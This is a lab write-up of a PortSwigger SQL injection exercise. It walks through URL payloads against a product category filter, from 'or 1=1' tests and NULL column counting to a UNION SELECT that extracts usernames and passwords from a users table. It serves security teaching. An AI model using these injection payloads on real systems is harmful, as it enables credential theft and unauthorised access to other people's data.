
# SQL injection UNION attack, retrieving data from other tables

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

---------------------------------------------

Reference: https://portswigger.net/web-security/sql-injection/union-attacks

---------------------------------------------

We see there are 2 values displayed in the table, the description and the content of the post:




![img](images/SQL%20injection%20UNION%20attack,%20retrieving%20data%20from%20other%20tables/1.png)


We find these payload are valid to display the 4 posts in Gifts and the second all the items:

```
/filter?category=Gifts'--
/filter?category=Gifts'+or+1=1--
```

Also, that there are 2 columns returned by the query and we can do a UNION attack with:

```
/filter?category=Gifts'+union+all+select+NULL,NULL--
```



![img](images/SQL%20injection%20UNION%20attack,%20retrieving%20data%20from%20other%20tables/2.png)


Knowing the table and database names we can retrieve the content from users using the payload:

```
/filter?category=Gifts'+union+all+select+username,password+from+users--
```



![img](images/SQL%20injection%20UNION%20attack,%20retrieving%20data%20from%20other%20tables/3.png)